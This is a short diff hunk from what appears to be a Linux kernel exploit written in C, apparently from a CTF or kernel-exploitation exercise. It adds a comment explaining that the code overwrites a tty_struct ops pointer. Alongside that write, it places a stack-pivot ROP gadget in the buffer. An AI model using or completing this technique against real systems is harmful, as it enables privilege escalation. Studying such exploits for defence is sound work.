@@ -113,6 +113,7 @@ void main()
   unsigned  long *p = (unsigned  long *)&buf; 
   p[12] = rop_mov_esp_0x39000000;
 
+  // update tty_struct ->ops member
   *(unsigned  long *)&buf[0x418] = g_buf; 
   write(fd, buf, 0x420);
   
